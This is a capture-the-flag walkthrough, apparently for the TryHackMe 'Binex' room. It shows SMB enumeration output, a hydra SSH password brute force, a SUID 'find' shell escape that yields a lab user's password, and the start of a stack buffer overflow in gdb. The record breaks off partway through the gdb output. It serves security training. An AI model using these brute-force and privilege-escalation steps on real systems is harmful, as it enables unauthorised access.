@@ -1,0 +1,924 @@
+Binex
+Difficulty: Medium
+Description: Escalate your privileges by exploiting vulnerable binaries.
+
+##  Recon:
+
+# Nmap:
+
+root@ip-10-10-252-46:~# nmap -sC -sV -O -T 4 -p- 10.10.54.218
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-24 11:07 GMT
+Nmap scan report for ip-10-10-54-218.eu-west-1.compute.internal (10.10.54.218)
+Host is up (0.00056s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
+|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
+|_  256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (EdDSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 02:42:2B:AB:96:99 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/24%OT=22%CT=1%CU=38954%PV=Y%DS=1%DC=D%G=Y%M=02422B%T
+OS:M=61EE8D8C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A
+OS:)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
+OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
+OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
+OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: THM_EXPLOIT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: thm_exploit
+|   NetBIOS computer name: THM_EXPLOIT\x00
+|   Domain name: \x00
+|   FQDN: thm_exploit
+|_  System time: 2022-01-24T11:29:11+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-01-24 11:29:11
+|_  start_date: 1600-12-31 23:58:45
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1328.44 seconds
+
+# enum4Linux
+
+root@ip-10-10-252-46:~/smbmap# enum4linux -U -G -S -P -d -o -R 1000-1100 10.10.54.218 
+WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
+WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan 24 13:00:44 2022
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.54.218
+RID Range ........ 1000-1100
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==================================================== 
+|    Enumerating Workgroup/Domain on 10.10.54.218    |
+ ==================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ===================================== 
+|    Session Check on 10.10.54.218    |
+ ===================================== 
+[+] Server 10.10.54.218 allows sessions using username '', password ''
+
+ =========================================== 
+|    Getting domain SID for 10.10.54.218    |
+ =========================================== 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ====================================== 
+|    OS information on 10.10.54.218    |
+ ====================================== 
+Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
+[+] Got OS info for 10.10.54.218 from smbclient: 
+[+] Got OS info for 10.10.54.218 from srvinfo:
+        THM_EXPLOIT    Wk Sv PrQ Unx NT SNT THM_exploit server (Samba, Ubuntu)
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+ ============================= 
+|    Users on 10.10.54.218    |
+ ============================= 
+Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
+Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.
+
+Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
+Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.
+
+ ========================================= 
+|    Share Enumeration on 10.10.54.218    |
+ ========================================= 
+WARNING: The "syslog" option is deprecated
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            THM_EXPLOIT
+
+[+] Attempting to map shares on 10.10.54.218
+//10.10.54.218/print$   Mapping: DENIED, Listing: N/A
+//10.10.54.218/IPC$     [E] Can't understand response:
+WARNING: The "syslog" option is deprecated
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+ ==================================================== 
+|    Password Policy Information for 10.10.54.218    |
+ ==================================================== 
+[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
+
+
+ ============================== 
+|    Groups on 10.10.54.218    |
+ ============================== 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ =============================================================== 
+|    Users on 10.10.54.218 via RID cycling (RIDS: 1000-1100)    |
+ =============================================================== 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''
+S-1-5-21-2007993849-1719925537-2372789573-1000 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1001 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1002 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1003 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1004 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1005 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1006 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1007 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1008 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1009 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1010 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1011 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1012 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1013 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1014 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1015 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1016 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1017 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1018 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1019 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1020 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1021 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1022 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1023 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1024 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1025 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1026 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1027 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1028 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1029 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1030 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1031 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1032 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1033 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1034 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1035 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1036 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1037 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1038 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1039 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1040 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1041 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1042 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1043 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1044 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1045 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1046 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1047 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1048 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1049 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1050 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1051 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1052 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1053 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1054 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1055 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1056 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1057 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1058 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1059 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1060 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1061 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1062 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1063 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1064 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1065 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1066 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1067 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1068 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1069 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1070 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1071 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1072 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1073 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1074 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1075 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1076 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1077 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1078 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1079 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1080 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1081 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1082 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1083 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1084 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1085 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1086 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1087 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1088 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1089 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1090 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1091 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1092 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1093 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1094 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1095 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1096 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1097 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1098 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1099 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1100 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-1000 *unknown*\*unknown* (8)
+S-1-5-32-1001 *unknown*\*unknown* (8)
+S-1-5-32-1002 *unknown*\*unknown* (8)
+S-1-5-32-1003 *unknown*\*unknown* (8)
+S-1-5-32-1004 *unknown*\*unknown* (8)
+S-1-5-32-1005 *unknown*\*unknown* (8)
+S-1-5-32-1006 *unknown*\*unknown* (8)
+S-1-5-32-1007 *unknown*\*unknown* (8)
+S-1-5-32-1008 *unknown*\*unknown* (8)
+S-1-5-32-1009 *unknown*\*unknown* (8)
+S-1-5-32-1010 *unknown*\*unknown* (8)
+S-1-5-32-1011 *unknown*\*unknown* (8)
+S-1-5-32-1012 *unknown*\*unknown* (8)
+S-1-5-32-1013 *unknown*\*unknown* (8)
+S-1-5-32-1014 *unknown*\*unknown* (8)
+S-1-5-32-1015 *unknown*\*unknown* (8)
+S-1-5-32-1016 *unknown*\*unknown* (8)
+S-1-5-32-1017 *unknown*\*unknown* (8)
+S-1-5-32-1018 *unknown*\*unknown* (8)
+S-1-5-32-1019 *unknown*\*unknown* (8)
+S-1-5-32-1020 *unknown*\*unknown* (8)
+S-1-5-32-1021 *unknown*\*unknown* (8)
+S-1-5-32-1022 *unknown*\*unknown* (8)
+S-1-5-32-1023 *unknown*\*unknown* (8)
+S-1-5-32-1024 *unknown*\*unknown* (8)
+S-1-5-32-1025 *unknown*\*unknown* (8)
+S-1-5-32-1026 *unknown*\*unknown* (8)
+S-1-5-32-1027 *unknown*\*unknown* (8)
+S-1-5-32-1028 *unknown*\*unknown* (8)
+S-1-5-32-1029 *unknown*\*unknown* (8)
+S-1-5-32-1030 *unknown*\*unknown* (8)
+S-1-5-32-1031 *unknown*\*unknown* (8)
+S-1-5-32-1032 *unknown*\*unknown* (8)
+S-1-5-32-1033 *unknown*\*unknown* (8)
+S-1-5-32-1034 *unknown*\*unknown* (8)
+S-1-5-32-1035 *unknown*\*unknown* (8)
+S-1-5-32-1036 *unknown*\*unknown* (8)
+S-1-5-32-1037 *unknown*\*unknown* (8)
+S-1-5-32-1038 *unknown*\*unknown* (8)
+S-1-5-32-1039 *unknown*\*unknown* (8)
+S-1-5-32-1040 *unknown*\*unknown* (8)
+S-1-5-32-1041 *unknown*\*unknown* (8)
+S-1-5-32-1042 *unknown*\*unknown* (8)
+S-1-5-32-1043 *unknown*\*unknown* (8)
+S-1-5-32-1044 *unknown*\*unknown* (8)
+S-1-5-32-1045 *unknown*\*unknown* (8)
+S-1-5-32-1046 *unknown*\*unknown* (8)
+S-1-5-32-1047 *unknown*\*unknown* (8)
+S-1-5-32-1048 *unknown*\*unknown* (8)
+S-1-5-32-1049 *unknown*\*unknown* (8)
+S-1-5-32-1050 *unknown*\*unknown* (8)
+S-1-5-32-1051 *unknown*\*unknown* (8)
+S-1-5-32-1052 *unknown*\*unknown* (8)
+S-1-5-32-1053 *unknown*\*unknown* (8)
+S-1-5-32-1054 *unknown*\*unknown* (8)
+S-1-5-32-1055 *unknown*\*unknown* (8)
+S-1-5-32-1056 *unknown*\*unknown* (8)
+S-1-5-32-1057 *unknown*\*unknown* (8)
+S-1-5-32-1058 *unknown*\*unknown* (8)
+S-1-5-32-1059 *unknown*\*unknown* (8)
+S-1-5-32-1060 *unknown*\*unknown* (8)
+S-1-5-32-1061 *unknown*\*unknown* (8)
+S-1-5-32-1062 *unknown*\*unknown* (8)
+S-1-5-32-1063 *unknown*\*unknown* (8)
+S-1-5-32-1064 *unknown*\*unknown* (8)
+S-1-5-32-1065 *unknown*\*unknown* (8)
+S-1-5-32-1066 *unknown*\*unknown* (8)
+S-1-5-32-1067 *unknown*\*unknown* (8)
+S-1-5-32-1068 *unknown*\*unknown* (8)
+S-1-5-32-1069 *unknown*\*unknown* (8)
+S-1-5-32-1070 *unknown*\*unknown* (8)
+S-1-5-32-1071 *unknown*\*unknown* (8)
+S-1-5-32-1072 *unknown*\*unknown* (8)
+S-1-5-32-1073 *unknown*\*unknown* (8)
+S-1-5-32-1074 *unknown*\*unknown* (8)
+S-1-5-32-1075 *unknown*\*unknown* (8)
+S-1-5-32-1076 *unknown*\*unknown* (8)
+S-1-5-32-1077 *unknown*\*unknown* (8)
+S-1-5-32-1078 *unknown*\*unknown* (8)
+S-1-5-32-1079 *unknown*\*unknown* (8)
+S-1-5-32-1080 *unknown*\*unknown* (8)
+S-1-5-32-1081 *unknown*\*unknown* (8)
+S-1-5-32-1082 *unknown*\*unknown* (8)
+S-1-5-32-1083 *unknown*\*unknown* (8)
+S-1-5-32-1084 *unknown*\*unknown* (8)
+S-1-5-32-1085 *unknown*\*unknown* (8)
+S-1-5-32-1086 *unknown*\*unknown* (8)
+S-1-5-32-1087 *unknown*\*unknown* (8)
+S-1-5-32-1088 *unknown*\*unknown* (8)
+S-1-5-32-1089 *unknown*\*unknown* (8)
+S-1-5-32-1090 *unknown*\*unknown* (8)
+S-1-5-32-1091 *unknown*\*unknown* (8)
+S-1-5-32-1092 *unknown*\*unknown* (8)
+S-1-5-32-1093 *unknown*\*unknown* (8)
+S-1-5-32-1094 *unknown*\*unknown* (8)
+S-1-5-32-1095 *unknown*\*unknown* (8)
+S-1-5-32-1096 *unknown*\*unknown* (8)
+S-1-5-32-1097 *unknown*\*unknown* (8)
+S-1-5-32-1098 *unknown*\*unknown* (8)
+S-1-5-32-1099 *unknown*\*unknown* (8)
+S-1-5-32-1100 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\kel (Local User)
+Use of uninitialized value $user_info in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 936.
+
+S-1-22-1-1001 Unix User\des (Local User)
+Use of uninitialized value $user_info in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 936.
+
+S-1-22-1-1002 Unix User\tryhackme (Local User)
+Use of uninitialized value $user_info in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 936.
+
+S-1-22-1-1003 Unix User\noentry (Local User)
+Use of uninitialized value $user_info in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 936.
+
+enum4linux complete on Mon Jan 24 13:01:16 2022
+
+## Foothhold
+
+# Bruteforing ssh with Hydra
+
+hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt $IP ssh
+
+ssh tryhackme@$IP
+
+## Manual PrivEsc Assessment
+
+tryhackme@THM_exploit:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+-rwsr-xr-x 1 kel kel 8600 Jan 17  2020 /home/des/bof
+-rwsr-sr-x 1 des des 238080 Nov  5  2017 /usr/bin/find
+
+# As user Des use the find binary to execute a sh shell to read the first flag.
+# GTFOBins!
+
+/usr/bin/find . -exec /bin/sh -p \; -quit
+
+$ cat /home/des/flag.txt
+Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.
+
+You flag is THM{*********}
+
+login crdential (In case you need it)
+username: des
+password: destructive_72656275696c64
+
+# Copy Credentials! 
+
+## Buffer Overflow
+
+## MASSIVE DISCLAIMERS ##
+# I used this machine to really get my first buffer overflow done. 
+# Please Acknowledge this Walkthrough as more a noob's adventure to practice "mechanisation of a method" - Daniel Messler
+
+
+# I used a variety of resources for this:
+# Writeups:
+https://www.notion.so/BINEX-WRITE-UP-346d388fc1a34ceb83bfbb20318fb58b
+https://m0ndzon3.medium.com/
+https://cyberaguiar.com/tryhackme/binex-writeup-baron-sammedit/
+https://github.com/Syp1ng/Writeups/blob/master/THM/Binex.pdf
+
+# Please Subcribe to these youtube channels
+https://www.youtube.com/c/ippsec # IppSec various HTB with bofs; Ippsec does actually rock.
+https://www.youtube.com/channel/UCksdNO8hAiOQoWZhEXhyyZA # Bursa is AWESOME, she has been lots releasing binex stuff recently. 
+https://www.youtube.com/watch?v=Z2pQuGmFNrM # <- specifically  Alh4zr4d https://www.youtube.com/channel/UCz-Z-d2VPQXHGkch0-_KovA
+https://www.youtube.com/c/LiveOverflow # Health dose at gentle pace, good English as a second language probably
+https://www.youtube.com/c/ThomWiggers # Good Course!
+
+# Key advice that anyone that understands that this is not the best resource can take away from me is:
+#
+# Be somewhat agnostic about Tooling: GDB seems like a MUST (+ gef/pwntools) 
+# pwntools is not required, but recommended
+# WRITE EVERYTHING YOURSELF - see below - THEN work towards templates of binex
+# If you don't understand as well as you like(like me) write a tool that does what pwntools,gef,etc does: 
+# # # This tool would handle: 
+# # # Endianess, Blacklisting, Pattern Generating, Pattern Assessment(Recursive Functions on STACK), hex and binary encoding, arrangement(sizes and placemnent)
+# # # Don't worry about shellcode writing
+# C programs without functions containing "n" are unsafe, 
+# # Stumbling areas of key concern:
+# Direction of stack growth
+# Topology of: Registers, Stack - how of data flow # Ghidra and Visual aids are key
+
+
+## Use back ticks to avoid escape character '\' in golang strings
+
+## We get to look at the bof64, I suggest NOT looking at it, but I was strapped for time, had banged my head against the beginner buffer overflow room of THM
+## Also my first "realish" attempt at one so, with all the handholding that worked
+
+# Phase 1: Enumerate the SIZE of the bof BLIND
+
+des@THM_exploit:~$ cat bof64.c
+#include <stdio.h>
+#include <unistd.h>
+
+int foo(){
+        char buffer[600];
+        int characters_read;
+        printf("Enter some string:\n");
+        characters_read = read(0, buffer, 1000);
+        printf("You entered: %s", buffer);
+        return 0;
+}
+
+void main(){
+        setresuid(geteuid(), geteuid(), geteuid());
+        setresgid(getegid(), getegid(), getegid());
+
+        foo();
+}
+
+## We need 600 chars to overflow, we need some scripting to aid in creation.
+## You would not get it this easy is real world ethical hacking or OSCP probably so
+
+# FUZZ to overflow
+# FUZZ with a Pattern to find extact offset
+# excute shellcode at address within 600 bytes given
+
+# 1. FUZZ
+gdb bof
+(gdb) run < <(python -c 'print("\x41"*1000)')
+Starting program: /home/des/bof < <(python -c 'print("\x41"*1000)')
+Enter some string:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555555484e in foo ()
+(gdb) 
+
+(gdb) info register
+rax            0x0      0
+rbx            0x3e9    1001
+rcx            0x0      0
+rdx            0x0      0
+rsi            0x555555554956   93824992233814
+rdi            0x7ffff7dd0760   140737351845728
+rbp            0x4141414141414141       0x4141414141414141
+rsp            0x7fffffffe4a8   0x7fffffffe4a8
+r8             0xffffffffffffffed       -19
+r9             0x25e    606
+r10            0x5555557564cb   93824994337995
+r11            0x555555554956   93824992233814
+r12            0x3e9    1001
+r13            0x7fffffffe5a0   140737488348576
+r14            0x0      0
+r15            0x0      0
+rip            0x55555555484e   0x55555555484e <foo+84>
+eflags         0x10202  [ IF RF ]
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+
+
+# I know because this is not blind that the buffer is of size [600]
+# Also that c char buffers ultimate one byte at teh end as \0 the null char to close the string.
+# By input more that the char[600] is declared to hold we overwrite that final element of the array, thus overflowing it.
+# We try to overflow it such that the address that overflows into the $rsp (stack point that is the where the return returns to in virtual address space. If overflow this with the precise address of the beginning of our shell code the address in the register
+# $rsp will GOTO the address BACK on to the stack where we put our shell code. Two techniques for non ASLR (Address space layout randomization), can be used. Either the famous NOP sled, padding till the desired point to a $rsp such that, the CPU does No operation but move to the next sequencial NOP instruction till it reaches our desire destination. Or we debug the program to just to get a ret instruct pointer address (containing that operation) then our address of the start of our shell code to then exploit. ASLR is out of scope of this blog and room and WAY out of my skill range, but brief is randomises the layout in virtual address of the programm to make it very so you would have to be very luck to find the ret pointers potential overflowing valuable (in an exploitabled sense) addresses of instructions, pointers to instruction and from what I have breifly heard from videos and can remember it becomes either more of fiddly dance around the virtual address space or exploiting the algorhythm.
+
+
+(gdb) x/100x $rsp
+0x7fffffffe4a8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe4b8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe4c8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe4d8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe4e8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe4f8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe508: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe518: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe528: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe538: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe548: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe558: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe568: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe578: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe588: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe598: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe5a8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe5b8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe5c8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe5d8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe5e8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe5f8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe608: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe618: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe628: 0xffffef01      0x00007fff      0xffffef14      0x00007fff
+(gdb) x/100x $rsp-700
+0x7fffffffe1ec: 0x00007fff      0x00000012      0x00000000      0xf7dd0760
+0x7fffffffe1fc: 0x00007fff      0x55554934      0x00005555      0xf7a64b62
+0x7fffffffe20c: 0x00007fff      0xf79e90e8      0x00007fff      0x000003e9
+0x7fffffffe21c: 0x00000000      0xffffe4a0      0x00007fff      0x000003e9
